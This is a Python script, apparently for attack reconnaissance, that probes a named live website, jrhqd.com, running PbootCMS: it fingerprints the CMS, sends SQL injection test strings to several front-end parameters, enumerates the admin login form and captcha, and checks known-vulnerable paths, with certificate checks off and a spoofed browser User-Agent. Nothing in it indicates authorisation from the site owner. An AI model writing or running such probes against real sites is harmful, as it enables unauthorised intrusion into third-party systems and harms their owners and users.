#!/usr/bin/env python3
"""pboot_jrhqd.py - jrhqd.com PbootCMS 漏洞探测"""
import urllib.request, urllib.parse, ssl, re

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://jrhqd.com'

def fetch(url, timeout=8, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
            headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded'} if data else UA)
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return r.status, r.read(60000).decode('utf-8', 'ignore'), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read(60000).decode('utf-8', 'ignore'), e.geturl()
    except Exception as e:
        return 0, repr(e)[:100], ''

print('=== 首页指纹 ===')
st, b, _ = fetch(BASE + '/')
m = re.findall(r'pbootcms[\s\S]{0,30}|pb_lang|Powered by[^<]{0,30}', b, re.I)
print('marks:', m[:5], 'st:', st, 'size:', len(b))

print('\n=== 前台SQLi ===')
for p in ["/index.php?list=1%27", "/index.php?tag=1%27", "/index.php?ext=1%27",
          "/index.php?keyword=1%27", "/index.php?p=1%27", "/index.php?search=1%27",
          "/index.php?cate=1%27", "/index.php?list=1%20and%201=1",
          "/index.php?list=1%20and%201=2"]:
    st, b, fu = fetch(BASE + p)
    err = re.findall(r'SQLSTATE|syntax error|SQL|error|warning|PbootCMS', b, re.I)
    print('%s -> st=%d size=%d err=%s' % (p, st, len(b), err[:2] if err else ''))

print('\n=== 后台 ===')
st, b, fu = fetch(BASE + '/admin.php')
print('admin.php -> st=%d size=%d fu=%s' % (st, len(b), fu))
inputs = re.findall(r'<input[^>]*name="([^"]+)"', b)
print('fields:', inputs[:10])
forms = re.findall(r'<form[^>]*action="([^"]*)"', b)
print('form action:', forms[:3])
print('has captcha:', 'captcha' in b.lower() or '验证码' in b)

print('\n=== 已知漏洞路径 ===')
for p in ['/admin.php?p=/Index/login', '/index.php?p=/api', '/api.php',
          '/index.php?p=/member', '/sitemap.xml']:
    st, b, fu = fetch(BASE + p)
    print('%s -> st=%d size=%d' % (p, st, len(b)))
